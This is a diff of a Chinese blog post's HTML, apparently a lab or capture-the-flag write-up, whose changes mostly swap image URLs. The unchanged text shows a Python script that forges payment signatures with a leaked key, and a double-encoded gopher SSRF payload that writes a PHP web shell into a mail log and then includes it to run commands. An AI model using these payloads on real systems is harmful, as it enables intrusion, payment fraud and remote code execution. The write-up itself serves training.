@@ -30,18 +30,18 @@
 <meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d2ae401db2.png">
 <meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d2b04168fc.png">
 <meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d2b00a969a.png">
-<meta property="og:image" content="https://youke1.picui.cn/s1/2025/12/05/69329a9563f67.png">
-<meta property="og:image" content="https://youke1.picui.cn/s1/2025/12/05/6932a5399c468.png">
-<meta property="og:image" content="https://youke1.picui.cn/s1/2025/12/05/6932a5494be1c.png">
-<meta property="og:image" content="https://youke1.picui.cn/s1/2025/12/05/6932f1c575688.png">
-<meta property="og:image" content="https://youke1.picui.cn/s1/2025/12/05/6932f31691e55.png">
-<meta property="og:image" content="https://youke1.picui.cn/s1/2025/12/05/6932f531eef6a.png">
-<meta property="og:image" content="https://youke1.picui.cn/s1/2025/12/05/6932f60e97831.png">
-<meta property="og:image" content="https://youke1.picui.cn/s1/2025/12/05/6932f736ef7d4.png">
-<meta property="og:image" content="https://youke1.picui.cn/s1/2025/12/05/6932f8bb39c7a.png">
-<meta property="og:image" content="https://youke1.picui.cn/s1/2025/12/05/6932fe3671ad7.png">
+<meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d2c139b9e8.png">
+<meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d2c1331fd7.png">
+<meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d2c1222bf1.png">
+<meta property="og:image" content="https://s41.ax1x.com/2025/12/13/pZMYxN6.png">
+<meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d2e35ba272.png">
+<meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d2e34ef4bb.png">
+<meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d2e357c040.png">
+<meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d2e73729e4.png">
+<meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d2e753966d.png">
+<meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d2deb0f117.png">
 <meta property="article:published_time" content="2025-12-05T01:27:02.000Z">
-<meta property="article:modified_time" content="2025-12-13T09:00:17.574Z">
+<meta property="article:modified_time" content="2025-12-13T09:28:28.877Z">
 <meta property="article:author" content="My0n9s">
 <meta property="article:tag" content="内部靶场">
 <meta name="twitter:card" content="summary">
@@ -216,7 +216,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-12-13 17:00:17" itemprop="dateModified" datetime="2025-12-13T17:00:17+08:00">2025-12-13</time>
+      <time title="Modified: 2025-12-13 17:28:28" itemprop="dateModified" datetime="2025-12-13T17:28:28+08:00">2025-12-13</time>
     </span>
 
   
@@ -271,7 +271,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">payOrder</span>(<span class="params">request, orderid</span>):</span><br><span class="line">	o = get_object_or_404(Order, <span class="built_in">id</span>=orderid, user=request.user, status=Order.ONGOING)</span><br><span class="line">	form = &#123;</span><br><span class="line">		<span class="string">&#x27;order_id&#x27;</span>: o.<span class="built_in">id</span>,</span><br><span class="line">		<span class="string">&#x27;buyer_id&#x27;</span>: o.user.<span class="built_in">id</span>,</span><br><span class="line">		<span class="string">&#x27;good_id&#x27;</span>: o.good.<span class="built_in">id</span>,</span><br><span class="line">		<span class="string">&#x27;buyer_point&#x27;</span>: o.user.profile.point,</span><br><span class="line">		<span class="string">&#x27;good_price&#x27;</span>: o.good.price,</span><br><span class="line">		<span class="string">&#x27;order_create_time&#x27;</span>: o.create_time.timestamp()</span><br><span class="line">	&#125;</span><br><span class="line">	str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">&#x27;&amp;&#x27;</span>.join([<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">	<span class="comment">#print(str2sign)</span></span><br><span class="line">	sign = md5(str2sign).hexdigest()</span><br><span class="line">	<span class="comment">#print(sign)</span></span><br><span class="line">	<span class="keyword">return</span> render(request, <span class="string">&#x27;payment/confirm.html&#x27;</span>, &#123;<span class="string">&#x27;form&#x27;</span>: form, <span class="string">&#x27;sign&#x27;</span>: sign&#125;)</span><br></pre></td></tr></table></figure>
 
 <p>我们可以再抓一个包看一下：</p>
-<p><img src="https://youke1.picui.cn/s1/2025/12/05/69329a9563f67.png" alt="shop1.png"></p>
+<p><img src="https://cdn4.winhlb.com/2025/12/13/693d2c139b9e8.png" alt="shop1.png"></p>
 <p>然而这里的<code>RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE </code>我们是可以从<code>secret.key</code>里面找到的， 所以这里的一切都可控了，我们就可以伪造</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">form = &#123;</span><br><span class="line">		<span class="string">&#x27;order_id&#x27;</span>: <span class="string">&quot;72&quot;</span>,</span><br><span class="line">		<span class="string">&#x27;buyer_id&#x27;</span>: <span class="string">&quot;18&quot;</span>,</span><br><span class="line">		<span class="string">&#x27;good_id&#x27;</span>: <span class="string">&quot;38&quot;</span>,</span><br><span class="line">		<span class="string">&#x27;buyer_point&#x27;</span>: <span class="string">&quot;300&quot;</span>,</span><br><span class="line">		<span class="string">&#x27;good_price&#x27;</span>: <span class="string">&quot;50&quot;</span>,</span><br><span class="line">		<span class="string">&#x27;order_create_time&#x27;</span>: <span class="string">&quot;1764952580.560779&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE=<span class="string">&quot;zhinianyuxin\n&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">&#x27;&amp;&#x27;</span>.join([<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment">#print(str2sign)</span></span><br><span class="line">sign = md5(str2sign).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(sign)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -279,8 +279,8 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elif u.profile.point &lt; g.price:</span><br><span class="line">			ret[&#x27;result&#x27;] = f&#x27;用户 &#123;u.username&#125; 可用积分不足，无法完成支付&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>所以我们还是得找一个积分多的用户来伪造，翻一下数据库可以发现管理员积分很多：</p>
-<p><img src="https://youke1.picui.cn/s1/2025/12/05/6932a5399c468.png" alt="shop2.png"></p>
-<p><img src="https://youke1.picui.cn/s1/2025/12/05/6932a5494be1c.png" alt="shop3.png"></p>
+<p><img src="https://cdn4.winhlb.com/2025/12/13/693d2c1331fd7.png" alt="shop2.png"></p>
+<p><img src="https://cdn4.winhlb.com/2025/12/13/693d2c1222bf1.png" alt="shop3.png"></p>
 <p>可以看到对应的user_id是16，我们再尝试一下抓包修改伪造：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">form = &#123;</span><br><span class="line">		<span class="string">&#x27;order_id&#x27;</span>: <span class="string">&quot;72&quot;</span>,</span><br><span class="line">		<span class="string">&#x27;buyer_id&#x27;</span>: <span class="string">&quot;16&quot;</span>,</span><br><span class="line">		<span class="string">&#x27;good_id&#x27;</span>: <span class="string">&quot;38&quot;</span>,</span><br><span class="line">		<span class="string">&#x27;buyer_point&#x27;</span>: <span class="string">&quot;300&quot;</span>,</span><br><span class="line">		<span class="string">&#x27;good_price&#x27;</span>: <span class="string">&quot;888&quot;</span>,</span><br><span class="line">		<span class="string">&#x27;order_create_time&#x27;</span>: <span class="string">&quot;1764952580.560779&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE=<span class="string">&quot;zhinianyuxin\n&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">&#x27;&amp;&#x27;</span>.join([<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">	<span class="comment">#print(str2sign)</span></span><br><span class="line">sign = md5(str2sign).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(sign)<span class="comment">#2ca432f0760c950a700626f8b1a63e15</span></span><br></pre></td></tr></table></figure>
 
@@ -296,20 +296,20 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0	ip6-localnet</span><br><span class="line">ff00::0	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">172.18.0.3	3c057f0514d8</span><br></pre></td></tr></table></figure>
 
 <p>给了个内网IP，这里思路发散些，首先就是对内网IP进行端口扫描，其实就是进行同网段扫描，这里可以发现存在一个<code>172.18.0.2</code>里面有个文件包含</p>
-<p><img src="https://youke1.picui.cn/s1/2025/12/05/6932f1c575688.png" alt="babypentest.png"></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/pZMYxN6"><img src="https://s41.ax1x.com/2025/12/13/pZMYxN6.png" alt="pZMYxN6.png"></a></p>
 <p>用dict协议来对端口进行扫描：</p>
-<p><img src="https://youke1.picui.cn/s1/2025/12/05/6932f31691e55.png" alt="babypentest2.png"></p>
+<p><img src="https://cdn4.winhlb.com/2025/12/13/693d2e35ba272.png" alt="babypentest2.png"></p>
 <p>发现25端口开着，SMTP协议，这里是利用SSRF来写shell到 &#x2F;var&#x2F;log&#x2F;mail.log。我们利用<code>gopherus</code>来生成payload:</p>
-<p><img src="https://youke1.picui.cn/s1/2025/12/05/6932f531eef6a.png" alt="babypentest3.png"></p>
+<p><img src="https://cdn4.winhlb.com/2025/12/13/693d2e34ef4bb.png" alt="babypentest3.png"></p>
 <p>几个细节：首先就是这里的php得二次编码一下，得绕过strpos的检测，另外这个payload也得编码一下，这种ssrf的最好都编码一下，防止引发歧义。</p>
-<p><img src="https://youke1.picui.cn/s1/2025/12/05/6932f60e97831.png" alt="babypentest4.png"></p>
+<p><img src="https://cdn4.winhlb.com/2025/12/13/693d2e357c040.png" alt="babypentest4.png"></p>
 <p>二次编码后的payload:<code>gopher%3A%2F%2F172%2E18%2E0%2E2%3A25%2F%5FMAIL%2520FROM%3A%253C%253F%2570hp%2520system%2528%2524%5FGET%255BMy0n9s%255D%2529%253F%253E%250ARCPT%2520To%3Ahello%2540123%2Ecom%250ADATA%250AFrom%3A%253C%253F%2570hp%2520system%2528%2524%5FGET%255BMy0n9s%255D%2529%253F%253E%250ASubject%3Ajust%2520a%2520test%250AMessage%3Atesttesttest%250A</code></p>
 <p>传参过去：<code>http://10.45.1.27/?x=gopher%3A%2F%2F172%2E18%2E0%2E2%3A25%2F%5FMAIL%2520FROM%3A%253C%253F%2570hp%2520system%2528%2524%5FGET%255BMy0n9s%255D%2529%253F%253E%250ARCPT%2520To%3Ahello%2540123%2Ecom%250ADATA%250AFrom%3A%253C%253F%2570hp%2520system%2528%2524%5FGET%255BMy0n9s%255D%2529%253F%253E%250ASubject%3Ajust%2520a%2520test%250AMessage%3Atesttesttest%250A</code></p>
 <p>这里是利用gopher协议来和<code>172.18.0.2</code>的smtp服务来进行通信，把我们构造的shell写到mail日志里面，然后包含。</p>
 <p>首先数据到达我们的服务器会url解码一次，然后经过curl_exec又会解码一次，这里进行编码的意义就是为了防止被误解析导致400 。</p>
-<p><img src="https://youke1.picui.cn/s1/2025/12/05/6932f736ef7d4.png" alt="babypentest5.png"></p>
+<p><img src="https://cdn4.winhlb.com/2025/12/13/693d2e73729e4.png" alt="babypentest5.png"></p>
 <p>可以发现是成功通信了的，我们也可以验证一下能不能getshell，防止产生歧义，还是得把特殊字符，比如 &#x2F;啥的，用cyberchef编码一下，然后打过去:</p>
-<p><img src="https://youke1.picui.cn/s1/2025/12/05/6932f8bb39c7a.png" alt="babypentest6.png"></p>
+<p><img src="https://cdn4.winhlb.com/2025/12/13/693d2e753966d.png" alt="babypentest6.png"></p>
 <p>可以发现有<code>ls</code>是执行了的；那么接下来再试试<code>ls /</code>  </p>
 <p>如果是直接传：<code>http://10.45.1.27/?x=http%3A%2F%2F172%2E18%2E0%2E2%3Fa%3D%2Fvar%2Flog%2Fmail%2Elog%26My0n9s%3Dls%20%2F</code> 会直接400</p>
 <p>这里我理解的是经过第一次解码：<code>http://172.18.0.2?a=/var/log/mail.log&amp;My0n9s=ls /</code>，然后curl_exec去执行的时候会直接400，所以还是要把特殊字符再编码一下就好了，比如 ls &#x2F; 里面的空格及&#x2F; 。空格和&#x2F;编码二次编码过去就是<code>%2520%252F</code> </p>
@@ -320,7 +320,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Q3：为什么执行ls /需要双重编码？</span><br><span class="line">提问者：</span><br><span class="line">执行http://172.18.0.2?a=/var/log/mail.log&amp;My0n9s=ls /时，</span><br><span class="line">先编码得到http%3A...%26My0n9s%3Dls%20%2F，</span><br><span class="line">还需要对%20%2F再编码为%2520%252F，为什么？</span><br><span class="line"></span><br><span class="line">回答者：</span><br><span class="line">这是多层URL编码的嵌套解析问题：</span><br><span class="line">单次编码的问题流程：</span><br><span class="line">原始：ls / → 编码：ls%20%2F</span><br><span class="line">作为参数：x=http://...&amp;My0n9s=ls%20%2F</span><br><span class="line">PHP自动解码：$x = &quot;http://...&amp;My0n9s=ls /&quot;</span><br><span class="line">curl发送：GET /?...&amp;My0n9s=ls /  # 空格未编码！</span><br><span class="line">结果：可能执行失败</span><br><span class="line">双重编码的正确流程：</span><br><span class="line"></span><br><span class="line">text</span><br><span class="line">原始：ls / </span><br><span class="line">→ 第一层：ls%20%2F</span><br><span class="line">→ 第二层：%20→%2520, %2F→%252F</span><br><span class="line">最终：ls%2520%252F</span><br><span class="line">PHP解码第一层：$x = &quot;http://...&amp;My0n9s=ls%20%2F&quot;</span><br><span class="line">curl发送：GET /?...&amp;My0n9s=ls%20%2F  # 正确编码</span><br><span class="line">目标服务器解码：My0n9s=ls /  # 成功执行</span><br><span class="line">根本原因：</span><br><span class="line">PHP自动解码：$_GET接收时会自动URL解码一次</span><br><span class="line">curl处理：需要确保特殊字符在HTTP请求中正确编码</span><br><span class="line">多层传递：编码状态需要在不同解析层级间保持</span><br></pre></td></tr></table></figure>
 
 <p>这里我补充一下如果空格不二次编码，带入到http协议，我们可以抓个包看下：</p>
-<p><img src="https://youke1.picui.cn/s1/2025/12/05/6932fe3671ad7.png" alt="babypentest7.png"></p>
+<p><img src="https://cdn4.winhlb.com/2025/12/13/693d2deb0f117.png" alt="babypentest7.png"></p>
 <p>如果你直接把%20变成空格，那就不是字符串空格了，而是打乱了http请求的格式。就会导致出错！</p>
 
     </div>
